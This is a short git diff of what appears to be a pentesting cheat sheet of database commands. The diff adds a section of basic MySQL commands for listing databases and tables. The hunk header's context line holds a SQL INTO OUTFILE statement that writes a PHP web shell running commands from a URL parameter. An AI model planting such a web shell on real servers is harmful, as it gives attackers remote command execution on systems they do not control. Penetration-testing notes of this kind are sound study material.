@@ -59,6 +59,13 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 mysql -h localhost -u myname -p
 ```
+### Show Info
+```
+SHOW DATABASES;
+use db_name
+SHOW TABLES;
+select * from table_name
+```
 ### Open SQLite3
 ```
 sqlite3 database.sqlite3
